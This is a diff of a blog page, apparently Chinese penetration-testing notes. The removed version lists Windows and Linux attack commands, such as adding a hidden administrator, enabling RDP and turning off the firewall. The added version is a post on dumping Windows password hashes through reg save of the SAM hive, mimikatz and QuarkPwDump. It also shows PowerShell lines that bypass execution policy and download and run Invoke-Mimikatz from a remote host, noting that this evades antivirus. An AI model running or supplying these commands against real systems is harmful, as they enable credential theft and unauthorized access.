@@ -7,18 +7,18 @@
 
 
 
-    <meta name="description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+    <meta name="description" content="Windows下抓取hash的几种方法 在windows渗透过程中，抓取windows用户hash有时候是非常有必要的，windows用户的密码加密后一般有两种hash形式：NTLM Hash和LM Hash(从windows vista和2008开始，微软就取消了LMHash),这些Hash通常有两个存储的地方，对于本地用户，存储在SAM数据库中，对于域用户，则存储在域控制器的NTDS.dit数">
 <meta property="og:type" content="article">
 <meta property="og:title" content="lsadaharu">
-<meta property="og:url" content="http://yoursite.com/2019/08/04/windows与linux命令/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/17/Windows下抓取hash的几种方法/index.html">
 <meta property="og:site_name" content="lsadaharu">
-<meta property="og:description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+<meta property="og:description" content="Windows下抓取hash的几种方法 在windows渗透过程中，抓取windows用户hash有时候是非常有必要的，windows用户的密码加密后一般有两种hash形式：NTLM Hash和LM Hash(从windows vista和2008开始，微软就取消了LMHash),这些Hash通常有两个存储的地方，对于本地用户，存储在SAM数据库中，对于域用户，则存储在域控制器的NTDS.dit数">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
-<meta property="og:updated_time" content="2019-07-27T04:43:18.888Z">
+<meta property="og:updated_time" content="2019-08-15T10:14:43.543Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="lsadaharu">
-<meta name="twitter:description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+<meta name="twitter:description" content="Windows下抓取hash的几种方法 在windows渗透过程中，抓取windows用户hash有时候是非常有必要的，windows用户的密码加密后一般有两种hash形式：NTLM Hash和LM Hash(从windows vista和2008开始，微软就取消了LMHash),这些Hash通常有两个存储的地方，对于本地用户，存储在SAM数据库中，对于域用户，则存储在域控制器的NTDS.dit数">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -144,13 +144,13 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-08-04T02:44:41.273Z">2019-08-04</time>
+                <time class="level-item has-text-grey" datetime="2019-08-17T03:35:01.658Z">2019-08-17</time>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    7 minutes read (About 1010 words)
+                    3 minutes read (About 434 words)
                 </span>
                 
                 
@@ -163,70 +163,42 @@
             
         </h1>
         <div class="content">
-            <h1 id="渗透windows与linux常用命令"><a href="#渗透windows与linux常用命令" class="headerlink" title="渗透windows与linux常用命令"></a>渗透windows与linux常用命令</h1><h2 id="渗透windows常用DOS命令"><a href="#渗透windows常用DOS命令" class="headerlink" title="渗透windows常用DOS命令"></a>渗透windows常用DOS命令</h2><ol>
-<li>查看本机ip信息: <code>ipconfig</code></li>
-<li>释放ip: <code>ipconfig/release</code></li>
-<li>重新获取ip: <code>ipconfig/renew</code></li>
-<li>查看系统信息: <code>systeminfo</code></li>
-<li>查看局域网计算机列表: <code>arp -a</code></li>
-<li>查看目录信息: <code>dir</code></li>
-<li>切换目录: <code>cd 目录名</code></li>
-<li>打开某个文件: <code>start 文件名</code></li>
-<li>打开某个网页: <code>start URL</code></li>
-<li>创建文件内容: <code>echo xxxx &gt; x.txt</code></li>
-<li>查看文件内容: <code>type xxx.txt</code></li>
-<li>创建目录: <code>md 目录名</code></li>
-<li>删除文件夹: <code>rd 文件夹名</code></li>
-<li>删除文件: <code>del 文件名</code></li>
-<li>复制文件: <code>copy 文件名</code></li>
-<li>移动文件或文件夹: <code>move 文件(夹)名 路径</code></li>
-<li>以树形列出文件夹结构: <code>tree 文件夹名</code></li>
-<li>查看以启动的服务: <code>net start</code></li>
-<li>开启或停止某个服务: <code>net start(stop) 服务名</code></li>
-<li>查看端口占用进程情况: <code>netstat -ano</code></li>
-<li>查看本机用户信息: <code>net user</code></li>
-<li>查看用户组信息: <code>net localgroup</code></li>
-<li>创建用户username: <code>net user username/add</code></li>
-<li>创建隐藏用户username: <code>net user username$/add</code></li>
-<li>将用户username添加到管理用户组: `net localgroup administrators username/add</li>
-<li>更改用户username密码: <code>net user username 更改的密码</code></li>
-<li>删除用户username: <code>net user username/delete</code></li>
-<li>激活(禁用)用户username: <code>net user username/active:yes(no)</code></li>
-<li>开启3389: <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>或者<code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code></li>
-<li>关闭防火墙: <code>netsh firewall set opmode mode=disable</code>或者<code>netsh advfirewall set allprofiles state off</code></li>
+            <h1 id="Windows下抓取hash的几种方法"><a href="#Windows下抓取hash的几种方法" class="headerlink" title="Windows下抓取hash的几种方法"></a>Windows下抓取hash的几种方法</h1><hr>
+<h2 id="在windows渗透过程中，抓取windows用户hash有时候是非常有必要的，windows用户的密码加密后一般有两种hash形式：NTLM-Hash和LM-Hash-从windows-vista和2008开始，微软就取消了LMHash-这些Hash通常有两个存储的地方，对于本地用户，存储在SAM数据库中，对于域用户，则存储在域控制器的NTDS-dit数据库中，当用户登陆时，这些Hash也可能存储在内存中，可被抓取到。"><a href="#在windows渗透过程中，抓取windows用户hash有时候是非常有必要的，windows用户的密码加密后一般有两种hash形式：NTLM-Hash和LM-Hash-从windows-vista和2008开始，微软就取消了LMHash-这些Hash通常有两个存储的地方，对于本地用户，存储在SAM数据库中，对于域用户，则存储在域控制器的NTDS-dit数据库中，当用户登陆时，这些Hash也可能存储在内存中，可被抓取到。" class="headerlink" title="在windows渗透过程中，抓取windows用户hash有时候是非常有必要的，windows用户的密码加密后一般有两种hash形式：NTLM Hash和LM Hash(从windows vista和2008开始，微软就取消了LMHash),这些Hash通常有两个存储的地方，对于本地用户，存储在SAM数据库中，对于域用户，则存储在域控制器的NTDS.dit数据库中，当用户登陆时，这些Hash也可能存储在内存中，可被抓取到。"></a>在windows渗透过程中，抓取windows用户hash有时候是非常有必要的，windows用户的密码加密后一般有两种hash形式：NTLM Hash和LM Hash(从windows vista和2008开始，微软就取消了LMHash),这些Hash通常有两个存储的地方，对于本地用户，存储在SAM数据库中，对于域用户，则存储在域控制器的NTDS.dit数据库中，当用户登陆时，这些Hash也可能存储在内存中，可被抓取到。</h2><h2 id="SAM全称叫做安全帐户管理器，是windows-xp-windows-vista-win7-win8-1和win10中存储用户密码的数据库文件。"><a href="#SAM全称叫做安全帐户管理器，是windows-xp-windows-vista-win7-win8-1和win10中存储用户密码的数据库文件。" class="headerlink" title="SAM全称叫做安全帐户管理器，是windows xp,windows vista,win7,win8.1和win10中存储用户密码的数据库文件。"></a>SAM全称叫做安全帐户管理器，是windows xp,windows vista,win7,win8.1和win10中存储用户密码的数据库文件。</h2><h2 id="提取SAM数据库的Hash"><a href="#提取SAM数据库的Hash" class="headerlink" title="提取SAM数据库的Hash"></a>提取SAM数据库的Hash</h2><ol>
+<li>使用reg命令保存注册表键</li>
 </ol>
-<h1 id="渗透linux常见命令"><a href="#渗透linux常见命令" class="headerlink" title="渗透linux常见命令"></a>渗透linux常见命令</h1><ol>
-<li>显示主机信息: <code>uname -a</code></li>
-<li>查看主机名: <code>hostname</code></li>
-<li>查看ip信息: <code>ipconfig</code></li>
-<li>查看当前路径: <code>pwd</code></li>
-<li>查看当前目录文件: <code>ls</code> 查看目录文件详细信息<code>ls -l</code></li>
-<li>创建目录: <code>mkdir 目录名</code></li>
-<li>创建新文件: <code>touch 文件名</code></li>
-<li>为文件创建软连接: <code>ln -s 源文件或者目录 链接文件或者目录</code></li>
-<li>复制文件或者目录: <code>cp 源文件或目录 目标文件或目录</code></li>
-<li>删除文件或目录: <code>rm -f</code>强制删除不提醒，<code>rm -r</code>递归删除整个目录树,<code>rm -i</code>删除文件或目录提醒。</li>
-<li>移动文件: <code>mv 源文件或目录</code></li>
-<li>查找文件: <code>find -name 文件名</code></li>
-<li>查看文件内容: <code>cat</code>+文件名</li>
-<li>分页显示文件内容: <code>more</code>+文件名</li>
-<li>查看文件属性: <code>file</code>+文件名</li>
-<li>gzip压缩打包以及解压:<code>gizp -9</code>+文件，最大压缩比压缩。保留源文件压缩<code>gzip -c 文件名 &gt; 文件名.gz</code>解压<code>gzip -dv</code>+文件名.gz，保留源文件解压<code>gzip -cd 文件名.gz &gt; 压缩文件存放的目录地址</code></li>
-<li>bzip2压缩打包: <code>bzip2</code>+文件名。保留源文件压缩<code>bzip2 -k</code>+文件名.解压<code>bzip2 -dv</code>+文件名.bzip2 .保留源文件解压: <code>bzip2 -kd</code>+文件名.bzip2</li>
-<li>tar压缩解压: 以gzip格式压缩<code>tar -zcvf newfile.tar.gz 源文件</code>  gzip格式解压 <code>tar -zxvf 压缩包名 -C 解压的文件放置的目录</code> 以bzip2格式压缩 <code>tar -jcvf newfile.tar.bzip2 源文件</code> 以bzip2格式解压 <code>tar -jxvf 压缩包名 -C 解压的文件放置的目录</code> 查看压缩包中的内容<code>tar -tvf 压缩包名</code></li>
-<li>改变文件权限: <code>chmod (r-&gt;4 w-&gt;2 x-&gt;1)777 文件名</code>或者按user(所有者)-&gt;u，group(组)-&gt;u，others(其他人)-&gt;u,三套属性a.r-&gt;(可读),w-&gt;(可写),x-&gt;(可执行)赋予权限，如chmod u+r test.c-&gt;赋予test.c所有者可读权限.chmod a+w test.c-&gt;赋予test.c所有者，组，以及其他人可写权限。</li>
-<li>更改文件/目录所属的拥有者和组: <code>chown 拥有者名:组名 文件或目录名</code> 只修改所属组: <code>chogrp -R 组名 文件或目录名</code></li>
-<li>添加用户: <code>adduser 用户名</code> 修改密码 <code>passwd 用户名</code>删除用户 <code>userdel 用户名</code></li>
-<li>查看目前登陆身份: <code>whoami</code></li>
-<li>查看目前登陆的用户和组: <code>id</code></li>
-<li>显示磁盘可读的情况: <code>df -h</code></li>
-<li>显示最后登陆的用户: <code>last</code></li>
-<li>查看进程: <code>ps -aux</code> 进程的动态情况 <code>top</code></li>
-<li>终止进程: <code>kill -9 PID</code></li>
-<li>显示进程ID的网络接口: <code>netstat -tulpn</code></li>
-<li>启动ip转发: <code>echo &#39;1&#39; &gt; /proc/sys/net/ipv4/ip_forward</code></li>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam c:\sam.hive </span><br><span class="line">reg save hklm\system c:\system.hive</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>使用powershell脚本及Invoke-NinjaCopy.ps1或者Invoke-mimikatz.ps1</li>
 </ol>
-
+<ul>
+<li><p>使用powershel在本地加载脚本Invoke-NinjaCopy.ps1命令:</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"Import-Module .\Invoke-NinjaCopy.ps1;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用在线加载Invoke-NinjaCopy.ps1的方式：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"IEX (New-Object Net.WebClient).DownloadString('http://ip/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用powershel在本地加载脚本Invoke-Mimikatz.ps1命令:</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"import-module Invoke-Mimikatz.ps1;Invoke-Mimikatz -Dumpcreds"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用在线加载Invoke-Mimikatz.ps1的方式：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"IEX (New-Object Net.WebClient).DownloadString('http://ip/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Dumpcreds"</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="3">
+<li>使用mimikatz</li>
+</ol>
+<ul>
+<li>查看是否有权限:privilege::debug</li>
+<li>读取密码:sekurlsa::logonPasswords</li>
+</ul>
+<ol start="4">
+<li>QuarkPwDump</li>
+</ol>
+<ul>
+<li>直接导出密码:QuarkPwDump.exe -dhl</li>
+</ul>
+<h2 id="使用上述工具和脚本时，大多数都会被防火墙或者杀软给防御掉一般使用在线加载脚本的方式导出密码文件。"><a href="#使用上述工具和脚本时，大多数都会被防火墙或者杀软给防御掉一般使用在线加载脚本的方式导出密码文件。" class="headerlink" title="使用上述工具和脚本时，大多数都会被防火墙或者杀软给防御掉一般使用在线加载脚本的方式导出密码文件。"></a>使用上述工具和脚本时，大多数都会被防火墙或者杀软给防御掉一般使用在线加载脚本的方式导出密码文件。</h2>
         </div>
         
         
@@ -276,7 +248,7 @@
     <div class="level post-navigation is-flex-wrap is-mobile">
         
         <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/04/sql注入_mysql_3/">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/17/MSSQL注入笔记/">
                 <i class="level-item fas fa-chevron-left"></i>
                 <span class="level-item"></span>
             </a>
@@ -284,7 +256,7 @@
         
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/04/sql注入_mysql_4/">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/17/通过phpmyadmin获取webshell/">
                 <span class="level-item"></span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
